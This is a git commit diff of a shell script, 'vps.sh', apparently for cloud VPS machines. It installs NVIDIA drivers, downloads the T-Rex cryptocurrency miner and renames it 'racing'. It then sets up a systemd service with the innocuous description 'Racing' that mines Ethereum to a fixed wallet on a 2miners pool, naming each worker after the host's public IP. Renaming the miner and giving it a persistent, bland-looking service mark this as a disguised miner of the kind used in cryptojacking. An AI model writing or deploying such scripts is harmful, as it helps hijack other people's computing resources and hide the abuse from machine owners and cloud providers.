8a4d27c3dd3c172330dd30507f2f3b5d902b3bd5
oursourcegtx <93318626+oursourcegtx@users.noreply.github.com>
2022-02-28 13:48:18 +0700

    Create vps.sh

--- vps.sh
+++ vps.sh
@@ -1,26 +1,21 @@
-cd /home/azureuser
-woker+=$(date +'%d%m_%H%M%S')
-if [[ ! -f isHaveSetupCoin.txt ]]
-then
-    echo "Start setup..."
-    sudo apt-get install linux-headers-$(uname -r) -y
-    distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-    wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-    sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-    sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-    echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
-    sudo apt-get update
-    sudo apt-get -y install cuda-drivers
-    sudo apt-get install libcurl3 -y
-    echo "xxx vip pro" > isHaveSetupCoin.txt
-    wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
-    sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w $woker &
-else
-    wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
-    sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w $woker &
-fi
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w myworker1111\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+cd /home
+myworker=$(date +'%d%m_%H%M%S_')
+myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
+myworker+=$myip
+sudo apt-get install linux-headers-$(uname -r) -y
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+sudo apt-get update
+sudo apt-get -y install cuda-drivers
+sudo apt-get install libcurl3 -y
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
+tar xvzf t-rex-0.21.6-linux.tar.gz
+mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
+./racing -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w $myworker &
+
